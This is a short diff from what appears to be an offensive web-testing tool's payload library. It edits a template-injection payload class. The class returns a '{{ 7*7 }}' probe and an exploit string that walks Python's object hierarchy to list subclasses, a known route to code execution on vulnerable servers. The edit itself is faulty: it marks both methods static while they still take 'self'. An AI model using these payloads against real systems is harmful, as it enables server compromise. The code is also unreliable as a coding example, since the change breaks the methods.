@@ -11,9 +11,11 @@ class TemplateInjection(Payload):
     def __init__(self):
         super(TemplateInjection, self).__init__()
 
+    @staticmethod
     def test(self):
         # simple mathematical expressions
         return "{{ 7*7 }}"
 
+    @staticmethod
     def exp(self):
         return "{{''.__class__.__mro__[2].__subclasses__()}}"
